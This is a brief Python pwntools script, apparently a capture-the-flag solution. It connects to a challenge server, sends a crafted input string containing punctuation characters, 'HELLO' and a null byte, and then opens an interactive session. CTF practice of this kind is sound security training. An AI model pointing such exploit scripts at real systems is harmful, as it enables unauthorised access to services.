from pwn import *

io = remote("chall.csivit.com", 30814)
io.send(",.,.,.,.,.,.,.\nHELLO\n\0")
io.interactive()
